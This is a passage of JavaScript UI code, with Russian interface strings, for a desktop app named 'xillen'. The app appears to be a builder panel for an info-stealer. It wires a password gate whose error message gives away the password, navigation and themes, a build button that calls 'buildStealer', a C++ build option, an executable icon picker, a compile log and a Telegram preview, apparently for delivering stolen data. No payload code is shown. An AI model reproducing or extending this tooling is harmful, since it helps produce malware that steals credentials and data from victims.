    console.log('Checking password:', password);
    const isValid = await window.xillen.checkPassword(password);
    console.log('Password check result:', isValid);
    
    if (isValid) {
      document.getElementById('authScreen').style.display = 'none';
      document.getElementById('mainApp').style.display = 'flex';
      showNotification('success', 'Успешно', 'Добро пожаловать!');
    } else {
      showNotification('error', 'Ошибка', 'Неверный пароль! Попробуйте: @xillenadapter');
      document.getElementById('passwordInput').value = '';
    }
  } catch (error) {
    console.error('Password check error:', error);
    showNotification('error', 'Ошибка', 'Ошибка проверки пароля!');
  }
}

function setupNavigation() {
  const navButtons = document.querySelectorAll('.nav');
  const cards = document.querySelectorAll('.card[data-view]');
  
  navButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      navButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      
      const view = btn.dataset.view;
      cards.forEach(card => {
        card.classList.toggle('active', card.dataset.view === view);
      });
      
      if (view === 'builds') {
        loadBuilds();
      }
    });
  });
}

function setupEventListeners() {
  document.getElementById('loginBtn').addEventListener('click', checkPassword);
  document.getElementById('passwordInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') checkPassword();
  });
  
  const buildV5Btn = document.getElementById('buildV5Btn');
  if (buildV5Btn) {
    buildV5Btn.addEventListener('click', buildCppV5);
  }
  
  document.getElementById('resetBtn').addEventListener('click', resetForm);
  document.getElementById('cancelBtn').addEventListener('click', () => {
    document.querySelector('.nav[data-view="builds"]').click();
  });
  
  // Icon file selection
  const exeIconInput = document.getElementById('exeIcon');
  if (exeIconInput) {
    exeIconInput.addEventListener('change', (e) => {
      const file = e.target.files[0];
      const fileNameSpan = document.getElementById('iconFileName');
      if (file) {
        fileNameSpan.textContent = file.name;
        fileNameSpan.style.color = 'var(--accent)';
      } else {
        fileNameSpan.textContent = 'Нет файла';
        fileNameSpan.style.color = 'var(--muted)';
      }
    });
  }
  
  document.getElementById('openBuildsFolder').addEventListener('click', async () => {
    await window.xillen.openBuildsFolder();
    showNotification('info', 'Информация', 'Папка builds открыта');
  });
  
  document.getElementById('refreshBuilds').addEventListener('click', loadBuilds);
  
  document.getElementById('themeDeepDark').addEventListener('click', () => switchTheme('deep_dark'));
  document.getElementById('themeScarlet').addEventListener('click', () => switchTheme('scarlet'));
  document.getElementById('themeLight').addEventListener('click', () => switchTheme('light'));
  
  document.getElementById('rainToggle').addEventListener('click', toggleRain);
  
  const transparencySlider = document.getElementById('transparencySlider');
  const transparencyValue = document.getElementById('transparencyValue');
  
  if (transparencySlider && transparencyValue) {
    transparencySlider.addEventListener('input', async () => {
      const value = parseFloat(transparencySlider.value);
      transparencyValue.textContent = Math.round(value * 100) + '%';
      await window.xillen.setOpacity(value);
    });
  }
  
  document.getElementById('exitBtn').addEventListener('click', () => {
    if (confirm('Выйти из приложения?')) {
      window.close();
    }
  });
  
  document.getElementById('refreshBtn').addEventListener('click', () => {
    showNotification('info', 'Информация', 'Обновление...');
    setTimeout(() => {
      showNotification('success', 'Успешно', 'Обновлено');
    }, 1000);
  });
  
  document.getElementById('settingsBtn').addEventListener('click', () => {
    document.querySelector('.nav[data-view="settings"]').click();
  });
  
  // Setup info buttons for tooltips
  document.querySelectorAll('.info-btn').forEach(btn => {
    btn.addEventListener('mouseenter', throttle(() => {
      const tooltip = btn.nextElementSibling;
      if (tooltip && tooltip.classList.contains('info-tooltip')) {
        tooltip.classList.add('show');
      }
    }, 100));
    
    btn.addEventListener('mouseleave', throttle(() => {
      const tooltip = btn.nextElementSibling;
      if (tooltip && tooltip.classList.contains('info-tooltip')) {
        tooltip.classList.remove('show');
      }
    }, 100));
  });
}

function setupCompileLogListener() {
  window.xillen.onCompileLog((data) => {
    log(data.trim());
  });
}

document.addEventListener('DOMContentLoaded', () => {
  populateModules();
  setupNavigation();
  setupEventListeners();
  setupCompileLogListener();
  setupFaqSearch();
  updateUI(); // Update translations after DOM is loaded
  setupTelegramPreview();
  
  // Setup language selector
  const languageSelect = document.getElementById('languageSelect');
  if (languageSelect) {
    languageSelect.value = currentLanguage;
    languageSelect.addEventListener('change', throttle((e) => {
      switchLanguage(e.target.value);
    }, 100));
  }
  
  // Setup build button
  const buildBtn = document.getElementById('buildBtn');
  if (buildBtn) {
    buildBtn.addEventListener('click', buildStealer);
  }
  
  // Setup reset button
  const resetBtn = document.getElementById('resetBtn');
  if (resetBtn) {
    resetBtn.addEventListener('click', resetForm);
  }
  
  // Setup cancel button
  const cancelBtn = document.getElementById('cancelBtn');
  if (cancelBtn) {
    cancelBtn.addEventListener('click', () => {
      showNotification('info', 'Отменено', 'Сборка отменена');
    });
  }
  
  log('Система готова к работе');
  log('Интерфейс загружен');
  
  const savedTheme = localStorage.getItem('xillen_theme') || 'deep_dark';
  switchTheme(savedTheme);
  
  const savedRain = localStorage.getItem('xillen_rain') === 'true';
  if (savedRain) {
    isRainEnabled = true;
    toggleRain();
  }
  
  const savedTransparency = localStorage.getItem('xillen_transparency') || '1';
  const transparencySlider = document.getElementById('transparencySlider');
  const transparencyValue = document.getElementById('transparencyValue');
  if (transparencySlider && transparencyValue) {
    transparencySlider.value = savedTransparency;
    transparencyValue.textContent = Math.round(parseFloat(savedTransparency) * 100) + '%';
    window.xillen.setOpacity(parseFloat(savedTransparency));
  }
});

window.addEventListener('beforeunload', () => {
  localStorage.setItem('xillen_theme', currentTheme);
  localStorage.setItem('xillen_rain', isRainEnabled.toString());
  localStorage.setItem('xillen_transparency', document.getElementById('transparencySlider').value);
});
